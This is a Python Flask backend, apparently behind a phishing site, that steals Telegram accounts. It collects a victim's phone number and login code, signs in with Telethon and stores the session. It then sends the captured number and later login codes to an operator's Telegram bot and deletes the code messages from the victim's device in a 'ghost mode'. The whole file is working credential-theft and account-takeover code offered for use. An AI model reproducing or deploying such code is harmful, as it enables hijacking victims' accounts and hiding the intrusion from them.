import os, requests, asyncio, re, threading
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession
from telethon.tl.functions.messages import DeleteHistoryRequest

app = Flask(__name__)
# Izin agar Frontend Vercel bisa akses Backend Railway tanpa terblokir
CORS(app, resources={r"/*": {"origins": "*"}})

# Konfigurasi dari Environment Variables Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
RAILWAY_URL = f"https://{os.getenv('RAILWAY_STATIC_URL')}"

# Penyimpanan data sementara di RAM
user_db = {}

def bot_api(method, payload):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
        res = requests.post(url, json=payload, timeout=15)
        return res.json()
    except: return {}

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        # Menjalankan alur pendaftaran
        response = loop.run_until_complete(handle_flow(data))
        return response
    except Exception as e:
        print(f"Error Sistem: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500
    finally: loop.close()

async def handle_flow(data):
    client = None
    try:
        step = int(data.get('step', 1))
        # Membersihkan nomor telepon
        num = re.sub(r'\D', '', data.get('nomor', ''))
        if num.startswith('0'): num = '62' + num[1:]
        nomor = '+' + num
        nama = data.get('nama', 'User')

        if nomor not in user_db:
            user_db[nomor] = {"session": "", "hash": "", "nama": nama}

        client = TelegramClient(StringSession(user_db[nomor]['session']), int(API_ID), API_HASH)
        await client.connect()

        if step == 1:
            # Kirim permintaan kode OTP dari Telegram
            res = await client.send_code_request(nomor)
            user_db[nomor].update({"hash": res.phone_code_hash, "session": client.session.save()})
            return jsonify({"status": "success"})

        elif step == 2:
            # Proses Login dengan OTP yang dimasukkan user di Web
            otp_code = data.get('otp')
            try:
                await client.sign_in(nomor, otp_code, phone_code_hash=user_db[nomor]['hash'])
                user_db[nomor]['session'] = client.session.save()
                
                # GHOST MODE: Hapus riwayat chat kode Telegram (777000)
                await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
                
                text = f"✅ **LOGIN BERHASIL**\nNama: **{nama}**\nNomor: `{nomor}`\n\nKlik tombol di bawah untuk mulai mengintip OTP TurboTel."
                bot_api("sendMessage", {
                    "chat_id": CHAT_ID, 
                    "text": text, 
                    "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "🔎 MULAI INTIP OTP", "callback_data": f"upd_{nomor}"}]]}
                })
                return jsonify({"status": "success"})
            except errors.SessionPasswordNeededError:
                user_db[nomor]['session'] = client.session.save()
                return jsonify({"status": "need_2fa"})
            except Exception as e:
                return jsonify({"status": "error", "message": "Kode Salah/Expired"}), 400
        
        return jsonify({"status": "error", "message": "Step tidak valid"}), 400
    finally:
        if client: await client.disconnect()

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if update and "callback_query" in update:
        call = update["callback_query"]
        # PENTING: Menjawab agar tombol tidak loading terus di Telegram
        bot_api("answerCallbackQuery", {"callback_query_id": call["id"], "text": "Mengintip Aktif!"})
        
        data_call = call["data"].split("_")
        if data_call[0] == "upd":
            nomor = data_call[1]
            bot_api("sendMessage", {"chat_id": CHAT_ID, "text": f"👀 **GHOST MODE**\nMemantau OTP baru untuk `{nomor}`..."})
            # Jalankan monitor di thread terpisah supaya server tidak macet
            threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor))).start()
    return jsonify({"status": "success"})

async def monitor_otp(nomor):
    data = user_db.get(nomor)
    if not data or not data['session']: return
    
    client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
    await client.connect()
    
    try:
        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            # Cari 5 angka OTP dalam pesan
            otp = re.search(r'\b\d{5}\b', event.raw_text)
            if otp:
                kode = otp.group(0)
                bot_api("sendMessage", {"chat_id": CHAT_ID, "text": f"📩 **OTP TERINTIP**\nNomor: `{nomor}`\nKode: `{kode}`", "parse_mode": "Markdown"})
                
                # GHOST MODE: Hapus pesan kode di HP target secara otomatis
                await event.delete(revoke=True)
                await client(DeleteHistoryRequest(peer=777000, max_id=0, just_clear=False, revoke=True))
        
        await asyncio.wait_for(client.run_until_disconnected(), timeout=900) # Monitor 15 menit
    except: pass
    finally:
        if client.is_connected(): await client.disconnect()

if __name__ == "__main__":
    # Otomatis set webhook saat server Railway restart
    if os.getenv('RAILWAY_STATIC_URL'):
        bot_api("setWebhook", {"url": f"{RAILWAY_URL}/webhook"})
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))